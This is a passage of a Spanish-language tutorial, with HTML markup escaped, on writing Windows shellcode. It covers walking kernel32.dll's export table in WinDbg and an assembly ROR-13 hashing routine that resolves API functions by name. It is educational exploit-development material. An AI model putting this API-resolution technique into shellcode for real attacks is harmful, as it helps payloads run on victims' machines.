&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   10.00 image version
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   10.00 subsystem version
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   9D000 size of image
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    1000 size of headers
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   B003F checksum
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00040000 size of stack reserve
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00001000 size of stack commit
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00100000 size of heap reserve
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00001000 size of heap commit
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    4140  DLL characteristics
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            Dynamic base
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            NX compatible
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            Guard
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   7B9F0 [    DCA6] address [size] of Export Directory
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   8C4F0 [     794] address [size] of Import Directory
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   97000 [     520] address [size] of Resource Directory
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;...
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Hemos obtenido la dirección virtual relativa de la tabla de directorios de exportación, así que determinemos si nuestro shellcode recupera el mismo valor. Podemos recorrer paso a paso las instrucciones del shellcode dentro de WinDbg y comprobar el valor de EDI antes de
añadirle la dirección base de kernel32.dll.&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; p
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eax=000000e8 ebx=76c00000 ecx=00000000 edx=00750000 esi=00778858 edi=007722f0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eip=00750032 esp=020bfd50 ebp=020bff74 iopl=0         nv up ei pl zr na pe nc
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00750032 8b7c0378        mov     edi,dword ptr [ebx+eax+78h] ds:0023:76c00160=0007b9f0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; t
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eax=000000e8 ebx=76c00000 ecx=00000000 edx=00750000 esi=00778858 edi=0007b9f0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eip=00750036 esp=020bfd50 ebp=020bff74 iopl=0         nv up ei pl zr na pe nc
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00750036 01df            add     edi,ebx
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; r edi
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;edi=0007b9f0
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Como podemos apreciar, se ha obtenido la dirección correcta de la tabla de directorios de exportación, si llegamos al final de la función &lt;code&gt;find_function_finished&lt;&#x2F;code&gt;, vemos como ESI apunta al último módulo exportado por &lt;code&gt;kernel32.dll&lt;&#x2F;code&gt;:&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;...
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; p
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eax=76c7d33c ebx=76c00000 ecx=00000648 edx=00750000 esi=76c8968a edi=76c7b9f0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eip=0075004e esp=020bfd50 ebp=020bff74 iopl=0         nv up ei pl nz na po nc
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0075004e 61              popad
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; da esi
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;76c8968a  &amp;quot;timeGetTime&amp;quot;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Para ver todas las funciones exportadas se puede hacer de la siguiente manera:&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; !dh kernel32 -e
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;_IMAGE_EXPORT_DIRECTORY 76c7b9f0 (size: 0000dca6)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Name: KERNEL32.dll 
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Characteristics: 00000000 Ordinal base: 1.
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Number of Functions: 1609. Number of names: 1609. EAT: 76c7ba18.
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   ordinal hint target   name
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;      ...
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;         8    5 76C1B920 AddAtomW
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;         9    6 76C2E190 AddConsoleAliasA
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;      1571 1570 76C43AD0 WriteProcessMemory
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;      ...
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;      1609 1608 76C28B80 timeGetTime
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;calcular-el-hash-del-nombre-de-una-funcion&quot;&gt;Calcular el hash del nombre de una función&lt;a class=&quot;zola-anchor&quot; href=&quot;#calcular-el-hash-del-nombre-de-una-funcion&quot; aria-label=&quot;Anchor link for: calcular-el-hash-del-nombre-de-una-funcion&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h2&gt;
&lt;p&gt;Después de obtener la dirección de la matriz &lt;code&gt;ArrayofNames&lt;&#x2F;code&gt;, estamos preparados para buscar otros símbolos.&lt;&#x2F;p&gt;
&lt;p&gt;Se usará un algoritmo hash para buscar el símbolo deseado en la matriz en lugar de la longitud de la cadena o varias partes del nombre del símbolo, estas funciones harán lo mismo que &lt;code&gt;GetProcAddress&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;El algorito hash, convierte cualquuier cadena a un DWORD. Esto nos permite reutilizar la función para cualquier símbolo que queramos, cada cadena generará un DWORD único.&lt;&#x2F;p&gt;
&lt;p&gt;El último paso de nuesto shellcode, obtenía la primera entrada en &lt;code&gt;ArrayofNames&lt;&#x2F;code&gt; y convertía el RVA en un VMA con el registro ESI apuntando al nombre del símbolo.&lt;&#x2F;p&gt;
&lt;p&gt;Implementaremos 3 funciones nuevas:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python z-code&quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;compute_hash:&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;xor eax, eax&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;             &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; NULL EAX
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;cdq&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                      &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; NULL EDX
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;cld&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                      &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; limpiar bandera de direccion
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;compute_hash_again:&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;lodsb&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                    &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Carga el siguiente byte de ESI en AL
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;test al, al&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;              &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Comprueba el terminador nulo
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;jz compute_hash_finished&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Si AL == 0, hemos dado con el nulo y salta
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;ror edx, 0x0d&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;            &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Rota EDX 13 bits a al derecha
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;add edx, eax&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;             &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Añade el nuevo byte al acumulador
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;jmp compute_hash_again&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;   &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; siguiente interación
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;compute_hash_finished:&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;La instrucción &lt;code&gt;CDQ&lt;&#x2F;code&gt; convierte un entero con signo de 32 bits (en &lt;code&gt;EAX&lt;&#x2F;code&gt;) en uno de 64 bits (en &lt;code&gt;EDX:EAX&lt;&#x2F;code&gt;), extendiendo el bit de signo de &lt;code&gt;EAX&lt;&#x2F;code&gt; a todo el registro &lt;code&gt;EDX&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Esto garantiza que ambos registros están en cero de forma compacta. Es una técnica común denominada &quot;zeroing&quot;.&lt;&#x2F;p&gt;
&lt;p&gt;La función &lt;code&gt;compute_hash&lt;&#x2F;code&gt;, comienza con una operación xor, que establece el registro EAX en nulo. Esta instrucción es seguida por la instrucción &lt;code&gt;cdq&lt;&#x2F;code&gt;, que utiliza el valor nulo en EAX para establecer EDX en nulo también.&lt;&#x2F;p&gt;
&lt;p&gt;LA última instrucción de esta función es &lt;code&gt;cld&lt;&#x2F;code&gt;, la cuál es encargada de limpiar la bandera de dirección (DF) en el registro eflags.
Ejecutar esta instrucción hará que todas las operaciones con Instrucciones de cadenas se incrementen los registros de índice, que son ESI&#x2F;EDI.&lt;&#x2F;p&gt;
&lt;p&gt;Esto &lt;strong&gt;garantiza que operaciones como &lt;code&gt;LODSB&lt;&#x2F;code&gt; avancen hacia adelante&lt;&#x2F;strong&gt;, es decir:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;lodsb&lt;&#x2F;code&gt; carga un byte desde &lt;code&gt;[ESI]&lt;&#x2F;code&gt; en &lt;code&gt;AL&lt;&#x2F;code&gt;, luego incrementa ESI.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Si por alguna razón la bandera DF estuviera en 1, &lt;code&gt;lodsb&lt;&#x2F;code&gt; decrementaría &lt;code&gt;ESI&lt;&#x2F;code&gt;, y recorrerías la cadena al revés.&lt;&#x2F;p&gt;
&lt;p&gt;Luego llegamos a la función &lt;code&gt;compute_hash_again&lt;&#x2F;code&gt;, que comienza con la instrucción &lt;code&gt;lodsb&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Esta instrucción cargará un byte de la memoria apuntada por ESI en el registro AL y luego incrementará o decrementará en base a la bandera DF. Le sigue una instrucción &lt;code&gt;test&lt;&#x2F;code&gt; que prueba si AL es nulo, saltará a &lt;code&gt;compute_hash_finished&lt;&#x2F;code&gt;, esta es una función vacía para usarla como marcador para el salto.&lt;&#x2F;p&gt;
&lt;p&gt;Si AL no es nulo, se obtiene una operación &lt;code&gt;ROR&lt;&#x2F;code&gt; bit a bit. Esta instrucción de ensamblaje rota los bits del primer operando a la derecha el número de posiciones de bit especificado en el segundo operando. En nuestro caso, EDX se rota a la derecha &lt;code&gt;0x0D&lt;&#x2F;code&gt;(13) bits.&lt;&#x2F;p&gt;
&lt;p&gt;Tras esta instrucción, añadiremos el valor de EAX en EDX y saltaremos al principio de &lt;code&gt;compute_hash_again&lt;&#x2F;code&gt;, está funcíon es un bucle que recorer cada byte del nombre del símbolo y lo añade a EDX justo después de la operación ror.&lt;&#x2F;p&gt;
&lt;p&gt;Al llegar al final del nombre de nuestro símbolo, el registro EDX contendrá un hash único de cuatro bytes para dicho símbolo. Esto significa que podemos compararlo con un hash pregenerado para determinar si hemos encontrado la entrada correcta.&lt;&#x2F;p&gt;
&lt;p&gt;Para hacer una comprobación, podemos emplear un script de python que en base al símbolo nos proporcione el hash único:&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$ python computehash.py timeGetTime
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0x998eaf95
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Colcaremos un breakpoint en la función &lt;code&gt;find_function&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; bp 00ea002e
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; g
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Breakpoint 0 hit
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eax=020cffcc ebx=76c00000 ecx=00000000 edx=00ea0000 esi=000f5a28 edi=000f22f0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eip=00ea002e esp=020cfd70 ebp=020cff74 iopl=0         nv up ei pl zr na pe nc
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00ea002e 60              pushad
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Pondremos unos puntos de interrupción en &lt;code&gt;xor eax, eax&lt;&#x2F;code&gt; que se establece en nulo después de obtener el RVA de la primera entrada de &lt;code&gt;AddressOfName&lt;&#x2F;code&gt;, lo que permite ver que símbolo se va a codificar.&lt;&#x2F;p&gt;
&lt;p&gt;EL segundo se establece después de ejecutar &lt;code&gt;compute_hash_again&lt;&#x2F;code&gt;, la función ha terminado de ejecutarse, lo que nos permite ver el resultado del hash en EDX.&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; u @eip l18
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00ea002e 60              pushad
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00ea002f 8b433c          mov     eax,dword ptr [ebx+3Ch]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00ea0032 8b7c0378        mov     edi,dword ptr [ebx+eax+78h]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00ea0036 01df            add     edi,ebx
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00ea0038 8b4f18          mov     ecx,dword ptr [edi+18h]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00ea003b 8b4720          mov     eax,dword ptr [edi+20h]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00ea003e 01d8            add     eax,ebx
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00ea0040 8945fc          mov     dword ptr [ebp-4],eax
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00ea0043 e309            jecxz   00ea004e
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00ea0045 49              dec     ecx
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00ea0046 8b45fc          mov     eax,dword ptr [ebp-4]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00ea0049 8b3488          mov     esi,dword ptr [eax+ecx*4]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00ea004c 01de            add     esi,ebx
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00ea004e 31c0            xor     eax,eax
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00ea0050 99              cdq
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00ea0051 fc              cld
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00ea0052 ac              lods    byte ptr [esi]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00ea0053 84c0            test    al,al
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00ea0055 7407            je      00ea005e
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00ea0057 c1ca0d          ror     edx,0Dh
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00ea005a 01c2            add     edx,eax
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00ea005c ebf4            jmp     00ea0052
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00ea005e 61              popad
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00ea005f c3              ret
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; bp 00ea004e
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; bp 00ea005e
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; bl
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;     0 d Enable Clear  00ea002e     0001 (0001)  0:**** 
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;     1 e Disable Clear  00ea004e     0001 (0001)  0:**** 
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;     2 e Disable Clear  00ea005e     0001 (0001)  0:**** 
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Como se puede apreciar en el siguiente Ouput de Windbg, coincide con nuestro script de python.&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; g
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Breakpoint 1 hit
